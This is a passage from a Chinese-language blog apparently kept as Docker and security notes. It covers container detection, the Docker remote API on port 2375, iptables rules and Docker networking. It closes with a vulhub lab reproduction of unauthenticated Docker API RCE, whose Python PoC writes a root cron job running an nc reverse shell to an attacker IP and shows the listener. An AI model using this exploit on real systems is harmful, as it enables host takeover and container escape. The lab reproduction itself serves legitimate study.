<td align="center"><kbd>Tab</kbd> 或 <kbd>Ctrl + 空格</kbd></td>
<td align="center">在图层和文件树视图之间切换</td>
</tr>
<tr>
<td align="center"><kbd>Ctrl + F</kbd></td>
<td align="center">过滤文件</td>
</tr>
<tr>
<td align="center"><kbd>Ctrl + A</kbd></td>
<td align="center">图层视图：查看聚合图像修改</td>
</tr>
<tr>
<td align="center"><kbd>Ctrl + L</kbd></td>
<td align="center">图层视图：查看当前图层修改</td>
</tr>
<tr>
<td align="center"><kbd>Space</kbd></td>
<td align="center">Filetree视图：折叠/取消折叠目录</td>
</tr>
<tr>
<td align="center"><kbd>Ctrl + A</kbd></td>
<td align="center">Filetreeview： 显示/隐藏添加的文件</td>
</tr>
<tr>
<td align="center"><kbd>Ctrl + R</kbd></td>
<td align="center">Filetreeview：显示/隐藏已删除的文件</td>
</tr>
<tr>
<td align="center"><kbd>Ctrl + M</kbd></td>
<td align="center">Filetreeview：显示/隐藏已修改的文件</td>
</tr>
<tr>
<td align="center"><kbd>Ctrl + U</kbd></td>
<td align="center">Filetreeview：显示/隐藏未修改的文件</td>
</tr>
<tr>
<td align="center"><kbd>PageUp</kbd></td>
<td align="center">Filetreeview：向上滚动页面</td>
</tr>
<tr>
<td align="center"><kbd>PageDown</kbd></td>
<td align="center">Filetreeview：向下滚动页面</td>
</tr>
</tbody></table>
<h3 id="其他工具-1"><a href="#其他工具-1" class="headerlink" title="其他工具"></a>其他工具</h3><p>下面分享一些对容器镜像进行分析的网站或工具</p>
<ol>
<li>contains，一个支持在线分析容器镜像的网站。</li>
<li>trivy，镜像扫描工具，可以检测镜像、文件系统、git存储库的漏洞以及配置问题</li>
<li>Clair，静态分析容器镜像中的漏洞</li>
<li>Anchore，用于深度分析docker镜像，扫描容器镜像和文件系统中的漏洞。</li>
<li>Dagda，用于对 docker 镜像和容器中的木马、恶意软件、病毒等已知漏洞进行静态分析。</li>
<li>Aqua Security，保护使用容器等云原生技术构建的应用程序。</li>
</ol>
<h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><p>该逆向止步于知道对方公开容器的情况下，为能根据对方未开源的容器进行操作。如能进入对方容器交互式下再进行逃逸到宿主机，那逆向容器可操作性价值并不高了，毕竟在能进入交互式时便能将容器整体文件打包了，进入宿主机还得获得root权限操作docker（windows系统就比较友好了，你懂的）</p>
<h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><p>在个人没有该容器的dockerfile文件时，逆向就能让我们方便的知道其配置信息，并且有机会逆向出其dockerfile文件</p>
<h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><p><span class="exturl" data-url="aHR0cHM6Ly94ei5hbGl5dW4uY29tL3QvMTEyNjIjdG9jLTA=">记录一次逆向容器镜像的过程 - 先知社区 (aliyun.com)</span></p>
<h1 id="判断是否工作在docker环境"><a href="#判断是否工作在docker环境" class="headerlink" title="判断是否工作在docker环境"></a>判断是否工作在docker环境</h1><h2 id="方式一：判断根目录下-dockerenv-文件"><a href="#方式一：判断根目录下-dockerenv-文件" class="headerlink" title="方式一：判断根目录下 .dockerenv 文件"></a>方式一：判断根目录下 .dockerenv 文件</h2><p>docker环境下：ls -alh /.dockerenv , 非docker环境，没有这个.dockerenv文件的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@4cb54de415d4:/# ls -alh /.dockerenv </span><br><span class="line">-rwxr-xr-x 1 root root 0 Sep  6 07:09 /.dockerenv</span><br></pre></td></tr></table></figure>



<p>注：定制化比较高的docker系统也可能没有这个文件</p>
<h2 id="方式二：查询系统进程的cgroup信息-判断是机子还是容器"><a href="#方式二：查询系统进程的cgroup信息-判断是机子还是容器" class="headerlink" title="方式二：查询系统进程的cgroup信息(判断是机子还是容器)"></a>方式二：查询系统进程的cgroup信息(判断是机子还是容器)</h2><p>docker 环境下：cat /proc/1/cgroup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@4cb54de415d4:/# cat /proc/1/cgroup </span><br><span class="line">10:devices:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">9:perf_event:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">8:net_cls,net_prio:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">7:cpu,cpuacct:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">6:freezer:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">5:memory:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">4:cpuset:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">3:blkio:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">2:pids:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br><span class="line">1:name=systemd:/docker/4cb54de415d470461a636d52a9a4f731eddbbcfdf80b4d0b46466ec1cf27f730</span><br></pre></td></tr></table></figure>


<p>kvm环境或者物理机环境下：cat /proc/1/cgroup</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@n12-015-133:~# cat /proc/1/cgroup </span><br><span class="line">10:cpuset:/</span><br><span class="line">9:freezer:/</span><br><span class="line">8:memory:/init.scope</span><br><span class="line">7:perf_event:/</span><br><span class="line">6:blkio:/init.scope</span><br><span class="line">5:net_cls,net_prio:/</span><br><span class="line">4:cpu,cpuacct:/init.scope</span><br><span class="line">3:pids:/init.scope</span><br><span class="line">2:devices:/init.scope</span><br><span class="line">1:name=systemd:/init.scope</span><br></pre></td></tr></table></figure>


<p>判断响应内容即可，主要看name和devices信息，目前来说最靠谱的方式</p>
<blockquote>
<p><strong>/proc/1/cgroup内包含”docker”字符串</strong></p>
</blockquote>
<h2 id="方式三：常见的命令却没有"><a href="#方式三：常见的命令却没有" class="headerlink" title="方式三：常见的命令却没有"></a>方式三：常见的命令却没有</h2><p>docker是利用Linux内核运行的，如没有wget命令这些常用的Linux命令，可判断是容器</p>
<h2 id="方式四：进程数很少，比如少于10条"><a href="#方式四：进程数很少，比如少于10条" class="headerlink" title="方式四：进程数很少，比如少于10条"></a>方式四：进程数很少，比如少于10条</h2><p>Linux操作系统本身是会运行很多进程的，因为就算是虚拟机也有很多基础的命令是需要运行的，为此会生成很多进程比容器的相比多得多</p>
<h1 id="shell判断docker是否运行一个容器"><a href="#shell判断docker是否运行一个容器" class="headerlink" title="shell判断docker是否运行一个容器"></a>shell判断docker是否运行一个容器</h1><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line"><span class="keyword">if</span> [[ -n $(docker ps -q -f <span class="string">&quot;name=^myMySQL$&quot;</span>) ]];<span class="keyword">then</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;has install mysql&quot;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">	<span class="built_in">echo</span> <span class="string">&quot;not install mysql&quot;</span></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure>

<p>参数解释</p>
<ul>
<li><code>-n</code> 检测字符串长度是否不为 0，不为 0 返回 true</li>
<li><code>docker ps -q -f &quot;name=^myMySQL$&quot;</code> 正常运行的且容器别名完全匹配<code>myMySQL</code>的容器ID</li>
</ul>
<h1 id="docker-swarm"><a href="#docker-swarm" class="headerlink" title="docker swarm"></a>docker swarm</h1><p>一个将docker集群变成单一虚拟德docker host工具，使用标准德docker API，能够方便docker集群的管理和扩展，在使用docker swarm时docker节点上会开放一个2375端口，绑定在0.0.0.0上，这个就是docker remote api，可以执行docker命令，比如访问<span class="exturl" data-url="aHR0cDovL2hvc3Q6MjM3NS9jb250YWluZXJzL2pzb24=">http://host:2375/containers/json</span> 会返回服务器当前运行的container列表，和在docker CLI上执行docker ps的效果一样，其他操作比如创建/删除container，拉取image等操作也都可以通过API调用完成。</p>
<p>这样命令就可被远程执行，进一步获取root权限</p>
<h1 id="docker-iptables"><a href="#docker-iptables" class="headerlink" title="docker iptables"></a>docker iptables</h1><p>docker deamon会在启动container的时候向iptables中添加转发的规则。</p>
<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><h3 id="处理流程"><a href="#处理流程" class="headerlink" title="处理流程"></a>处理流程</h3><p><strong>iptables是Linux中网络钩子，有四表五链</strong></p>
<p>filter表：防火墙规则，允许、阻止或丢弃进出的数据包</p>
<p>nat表：网络地址转换，内网的数据包收发室，有多种类型，常见的有SNAT，PANT，DNAT</p>
<p>mangle表：修改数据包的TTL，给数据包做不同的标记，策略路由等</p>
<p>raw表：一般用于跟踪状态，调试</p>
<p>优先级：raw，mangle，nat，filter</p>
<p>五链：</p>
<p>PREROUTING： 到达本机前的路由规则</p>
<p>INPUT：进入本机的规则</p>
<p>FORWARD：转发的规则</p>
<p>OUTPUT：本机发出的规则</p>
<p>POSTROUTING：发出后的路由规则</p>
<p><img data-src="https://img-blog.csdnimg.cn/20201025225944432.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5OTQ2OTE2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h3 id="命令与扩展"><a href="#命令与扩展" class="headerlink" title="命令与扩展"></a>命令与扩展</h3><p>清空表上的所有规则，默认为filter表：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -F</span><br></pre></td></tr></table></figure>

<p>链上操作规则，A追加，I前面插入，D删除，R替换，N新建一个自定义链，例如：<br>在第5条规则前插入禁止非192.168.1.0/24访问80端口</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT 5 -p tcp --dport 80 ! -s 192.168.1.0/24 -j DROP</span><br></pre></td></tr></table></figure>

<p>查看某个表的所有链上的规则：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -L -n -v --line-numbers</span><br></pre></td></tr></table></figure>

<p>filter表，常将lo网卡和已建立连接的规则放在最前面，降低系统负担：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line">iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>允许ping：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p icmp --icmp-type 8 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>允许连续范围端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -p udp --sport 1000:2000 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>每个链都有默认规则，禁止时可以设置白名单，允许时可以设置黑名单<br>INPUT链默认禁止连接：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -P INPUT DROP</span><br></pre></td></tr></table></figure>

<p>iptables有很多扩展，不同的扩展有不同的功能，查看文档，man iptables-extensions常用的：</p>
<ul>
<li>多端口扩展</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-m multiport --dports 80,443</span><br></pre></td></tr></table></figure>

<ul>
<li>recent扩展，每30秒最多10个连接：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --set</span><br><span class="line">iptables -I INPUT -p tcp --dport 80 -m state --state NEW -m recent --update --seconds 30 --hitcount 10 -j DROP</span><br></pre></td></tr></table></figure>

<ul>
<li>connlimit扩展，限制并发连接数：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --syn --dport 80 -m connlimit --connlimit-above 100 -j REJECT</span><br></pre></td></tr></table></figure>

<ul>
<li>string扩展，字符串匹配禁止：</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -I INPUT -p tcp --sport 443 -m string --string &quot;xunlei&quot; --algo kmp -j DROP</span><br></pre></td></tr></table></figure>



<p>iptables规则都是保存在内存中的，重启规则会丢失，可以使用iptables-save和iptables-restore保存，还可以使用iptables-services</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 禁用firewalld</span><br><span class="line">#systemctl stop firewalld</span><br><span class="line">#systemctl disable firewalld</span><br><span class="line">yum -y install iptables-services</span><br><span class="line">service iptables save</span><br><span class="line">service iptables reload</span><br></pre></td></tr></table></figure>

<h3 id="系统默认规则"><a href="#系统默认规则" class="headerlink" title="系统默认规则"></a>系统默认规则</h3><p>安装iptables-services后，<code>/etc/sysconfig/iptables</code>文件中有默认规则：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">iptables -A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A INPUT -p icmp -j ACCEPT</span><br><span class="line">iptables -A INPUT -i lo -j ACCEPT</span><br><span class="line">iptables -A INPUT -p tcp -m state --state NEW -m tcp --dport 22 -j ACCEPT</span><br><span class="line">iptables -A INPUT -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line">iptables -A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br></pre></td></tr></table></figure>

<p>第四个是允许ssh登录<br>第五个是禁止其他连接通过INPUT，并返回icmp-host-prohibited错误<br>第六个是禁止FORWARD</p>
<h3 id="ipset的使用"><a href="#ipset的使用" class="headerlink" title="ipset的使用"></a>ipset的使用</h3><p>可与iptables结合，实现动态的白名单，并且可以设置过期时间</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ipset create ssh-allow hash:ip timeout 0</span><br><span class="line">ipset add ssh-allow 192.168.47.1 timeout 86400</span><br><span class="line">ipset list ssh-allow</span><br><span class="line">iptables -A INPUT -p tcp --dport 22 -m set --match-set ssh-allow src -j ACCEPT</span><br></pre></td></tr></table></figure>

<h3 id="SNAT与DNAT"><a href="#SNAT与DNAT" class="headerlink" title="SNAT与DNAT"></a>SNAT与DNAT</h3><p>SNAT常用于内部无法上网的机器通过网关上网，需要调整安全组和解除网关MAC与IP绑定。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># 网关打开核心转发</span><br><span class="line">echo &quot;net.ipv4.ip_forward=1&quot; &gt;&gt; /etc/sysctl.conf</span><br><span class="line">sysctl -p</span><br><span class="line"></span><br><span class="line"># 数据包离开前将源地址改为网关地址，动态上网时，常用-j MASQUERADE</span><br><span class="line">iptables -t nat -A POSTROUTING -o eth0 -s 192.168.1.0/24 -j SNAT --to 172.16.8.1</span><br><span class="line"></span><br><span class="line"># 不能上网的机器，修改网关</span><br><span class="line">route add default gw 192.168.1.1</span><br></pre></td></tr></table></figure>

<p>DNAT常用于将内部机器暴漏给外部用户使用。<br><code>iptables -t nat -A PREROUTING -d 172.16.8.1 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.20:8080</code></p>
<h3 id="ftp规则"><a href="#ftp规则" class="headerlink" title="ftp规则"></a>ftp规则</h3><p>ftp分为主动模式和被动模式。</p>
<p>主动模式数据流是server主动连接client的随机端口，一般客户端都工作在NAT网络中，客户端端口须层层路由开放，所以这种模式很少使用。</p>
<p>被动模式，server告知client数据连接端口，客户端连接server的数据连接端口，这个端口一般是随机的，需要服务端开放，使用iptables的连接追踪功能，可以很好的解决这个问题</p>
<p>加载ftp专用的追踪模块，modprobe nf_conntrack_ftp</p>
<p>开启ftp追踪模块后，仅需开放21端口即可（INPUT默认DROP，OUTPUT默认ACCEPT）<br>iptables -A INPUT -m state –state ESTABLISHED,RELATED -j ACCEPT<br>RELATED指明ftp关联的数据端口允许连接</p>
<h3 id="firewall-cmd命令"><a href="#firewall-cmd命令" class="headerlink" title="firewall-cmd命令"></a>firewall-cmd命令</h3><p>iptables分为ipv4和ipv6，两者是独立的，firewalld是iptables的python脚本，已经整合了ipv4和ipv6</p>
<p>与iptables不同的是，firewalld使用zone来管理防火墙<br>zone可以根据source，mac，ipset，interface等匹配，匹配不上的进入默认的public</p>
<p>查询默认zone：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --get-default-zone</span><br></pre></td></tr></table></figure>

<p>修改了规则需要重新加载才能生效：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>

<p>列出zone的所有规则：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --list-all --zone=public</span><br></pre></td></tr></table></figure>

<p>开放80端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">firewall-cmd --zone=public --add-port=80/tcp --permanent</span><br></pre></td></tr></table></figure>

<p>进行复杂的控制，需要rich规则，命令比较复杂，不推荐使用</p>
<h2 id="docker的iptables规则"><a href="#docker的iptables规则" class="headerlink" title="docker的iptables规则"></a>docker的iptables规则</h2><h3 id="docker网络类型"><a href="#docker网络类型" class="headerlink" title="docker网络类型"></a>docker网络类型</h3><ul>
<li><p>none：顾名思义，不使用网络，只使用lo</p>
</li>
<li><p>host：使用主机的网络</p>
</li>
<li><p>bridge：桥接，相当于nat，通过docker0分配一个172.17.0.x的地址使用</p>
</li>
<li><p>container：使用指定容器的网络</p>
</li>
</ul>
<h3 id="数据包处理流程"><a href="#数据包处理流程" class="headerlink" title="数据包处理流程"></a>数据包处理流程</h3><p>为便于测试，启动两个容器：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker run -d --rm --name nginx -p 80:80 nginx:1.16.1</span><br><span class="line">docker run -it --name busybox --rm busybox sh</span><br></pre></td></tr></table></figure>

<h3 id="filter表规则"><a href="#filter表规则" class="headerlink" title="filter表规则"></a>filter表规则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">iptables -N DOCKER</span><br><span class="line">iptables -N DOCKER-ISOLATION-STAGE-1</span><br><span class="line">iptables -N DOCKER-ISOLATION-STAGE-2</span><br><span class="line">iptables -N DOCKER-USER</span><br><span class="line">iptables -A FORWARD -j DOCKER-USER</span><br><span class="line">iptables -A FORWARD -j DOCKER-ISOLATION-STAGE-1</span><br><span class="line">iptables -A FORWARD -o docker0 -m conntrack --ctstate RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">iptables -A FORWARD -o docker0 -j DOCKER</span><br><span class="line">iptables -A FORWARD -i docker0 ! -o docker0 -j ACCEPT</span><br><span class="line">iptables -A FORWARD -i docker0 -o docker0 -j ACCEPT</span><br><span class="line">iptables -A DOCKER-ISOLATION-STAGE-1 -i docker0 ! -o docker0 -j DOCKER-ISOLATION-STAGE-2</span><br><span class="line">iptables -A DOCKER-ISOLATION-STAGE-1 -j RETURN</span><br><span class="line">iptables -A DOCKER-ISOLATION-STAGE-2 -o docker0 -j DROP</span><br><span class="line">iptables -A DOCKER-ISOLATION-STAGE-2 -j RETURN</span><br><span class="line">iptables -A DOCKER-USER -j RETURN</span><br></pre></td></tr></table></figure>

<p>主要是转发规则，默认FORWARD为DROP，DOCKER链处理到docker0的IP数据包，即容器对外的规则，例如：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iptables -A DOCKER -d 172.17.0.2/32 ! -i docker0 -o docker0 -p tcp -m tcp --dport 80 -j ACCEPT</span><br></pre></td></tr></table></figure>

<p>允许非docker0访问80端口</p>
<p>为了搞清楚DOCKER-ISOLATION-STAGE-2，需要创建一个bridge，开启一个nginx，并安装telnet</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">docker network create docker1</span><br><span class="line">docker run -d --rm --name nginx1 -p 8080:80 --net docker1 nginx:1.16.1</span><br><span class="line">docker exec -it nginx /bin/bash</span><br><span class="line"># 在nginx中安装telnet</span><br><span class="line">#apt update</span><br><span class="line">#apt install telnet</span><br><span class="line">#telnet 172.18.0.2 80</span><br></pre></td></tr></table></figure>

<p>可以看到<code>telnet 172.18.0.2 80</code>并不通，怎么实现的呢？<br>DOCKER-ISOLATION-STAGE-1规则是源网卡是docker0，而目的地不是docker0就进入DOCKER-ISOLATION-STAGE-2</p>
<p>而DOCKER-ISOLATION-STAGE-2中，有一条规则，<code>iptables -A DOCKER-ISOLATION-STAGE-2 -o br-afba712bfb32 -j DROP</code>，即不允许不同的网卡互相访问，这对于docker-compose非常有用，设计非常精妙</p>
<p>DOCKER-USER链用于自定义转发规则，优先级最高，可以限制进入容器的源IP地址：<br><code>iptables -I DOCKER-USER ! -s 192.168.47.1 -p tcp --dport 80 -j DROP</code><br>以上规则禁止非192.168.47.1的IP地址访问容器的80端口</p>
<h3 id="nat表规则"><a href="#nat表规则" class="headerlink" title="nat表规则"></a>nat表规则</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">iptables -t nat -N DOCKER</span><br><span class="line">iptables -t nat -A PREROUTING -m addrtype --dst-type LOCAL -j DOCKER</span><br><span class="line">iptables -t nat -A OUTPUT ! -d 127.0.0.0/8 -m addrtype --dst-type LOCAL -j DOCKER</span><br><span class="line">iptables -t nat -A POSTROUTING -s 172.17.0.0/16 ! -o docker0 -j MASQUERADE</span><br><span class="line">iptables -t nat -A DOCKER -i docker0 -j RETURN</span><br></pre></td></tr></table></figure>

<p>DOCKER链方便container自定义规则<br>POSTROUTING规则，使得container使用宿主机docker0的IP作为网关，便于接收外部返回的数据</p>
<p>有如下规则：<br><code>iptables -t nat -A DOCKER ! -i docker0 -p tcp -m tcp --dport 80 -j DNAT --to-destination 172.17.0.2:80</code><br>通过PREROUTING链和DOCKER链将主机的80端口流量转发给172.17.0.2，并通过filter表的FORWARD链返回给客户端</p>
<p>宿主机通过nat表的OUTPUT链是可以访问container的80端口的</p>
<p>nat表的POSTROUTING规则使得container可以访问外网</p>
<p>很奇怪的一条规则：<br><code>iptables -t nat -A POSTROUTING -s 172.17.0.2/32 -d 172.17.0.2/32 -p tcp -m tcp --dport 80 -j MASQUERADE</code><br>使得容器通过自己的IP172.17.0.2也可以访问80端口</p>
<p>最后网上的一张流程图：</p>
<p><img data-src="https://img-blog.csdnimg.cn/20201031165431445.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L20wXzQ5OTQ2OTE2,size_16,color_FFFFFF,t_70#pic_center" alt="在这里插入图片描述"></p>
<h1 id="docker漏洞复现"><a href="#docker漏洞复现" class="headerlink" title="docker漏洞复现"></a>docker漏洞复现</h1><h2 id="unauthorized-rce-（未授权访问命令执行）"><a href="#unauthorized-rce-（未授权访问命令执行）" class="headerlink" title="unauthorized-rce （未授权访问命令执行）"></a>unauthorized-rce （未授权访问命令执行）</h2><p>目标：192.168.31.1</p>
<p>攻击：192.168.31.133</p>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>利用docker swarm机制缺陷，进行挂载反弹shell，修改root进程，逃逸出容器，进入宿主机</p>
<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>vulhub环境搭建</p>
<p><img data-src="C:\Users\shell'co'de\AppData\Roaming\Typora\typora-user-images\image-20220806211550415.png" alt="image-20220806211550415"></p>
<p>docker run -d -p 2375 容器id</p>
<p><img data-src="C:\Users\shell'co'de\AppData\Roaming\Typora\typora-user-images\image-20220806211724654.png" alt="image-20220806211724654"></p>
<p>访问<span class="exturl" data-url="aHR0cDovL2hvc3Q6MjM3NS92ZXJzaW9u">http://host:2375/version</span> </p>
<p><img data-src="C:\Users\shell'co'de\AppData\Roaming\Typora\typora-user-images\image-20220806211810585.png" alt="image-20220806211810585"></p>
<p>证明环境搭建成功</p>
<h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><p>python需要安装docker库：<code>pip install docker</code></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> docker</span><br><span class="line"></span><br><span class="line">client = docker.DockerClient(base_url=<span class="string">&#x27;http://192.168.31.1:2375/&#x27;</span>)</span><br><span class="line">data = client.containers.run(<span class="string">&#x27;alpine:latest&#x27;</span>, <span class="string">r&#x27;&#x27;&#x27;sh -c &quot;echo &#x27;* * * * * /usr/bin/nc 192.168.31.133 23456 -e /bin/sh&#x27; &gt;&gt; /tmp/etc/crontabs/root&quot; &#x27;&#x27;&#x27;</span>, remove=<span class="literal">True</span>, volumes=&#123;<span class="string">&#x27;/etc&#x27;</span>: &#123;<span class="string">&#x27;bind&#x27;</span>: <span class="string">&#x27;/tmp/etc&#x27;</span>, <span class="string">&#x27;mode&#x27;</span>: <span class="string">&#x27;rw&#x27;</span>&#125;&#125;)</span><br></pre></td></tr></table></figure>

<p>client创建一个连接客户端，<code>dokcer -H tcp://&lt;ip&gt;:2375 run -it -v /:/mnt &lt;image ID&gt; /bin/bash</code></p>
<p>data选择要启动的容器，执行命令将宿主机的/etc目录 挂载到容器中，volumes为传入挂载的目录，规则是：[“docker-path:local-path”]，使用nc命令在攻击机端口23456</p>
<p>将目录挂载到容器中是为了能够逃出容器，进入宿主机。因为docker是以root权限运行的，docker命令只能在容器内部，与宿主机是隔离的状态，即使反弹了shell也无法进入宿主机，docker本身在运行容器的时候，可以将本地文件或目录挂载到容器内部，并且在容器内部这些文件或者目录都是可以修改的</p>
<p>可以获取root权限进程，并且能够进行修改文件或目录，就可以进行利用了。</p>
<h3 id="nc监听端口"><a href="#nc监听端口" class="headerlink" title="nc监听端口"></a>nc监听端口</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvvp 23456</span><br></pre></td></tr></table></figure>

<p>写入crontab文件，成功反弹shell：</p>
<p><img data-src="C:\Users\shell'co'de\Desktop\漏洞挖掘\渗透测试\漏洞复现\vulhub\docker\unauthorized-rce\1.png"></p>
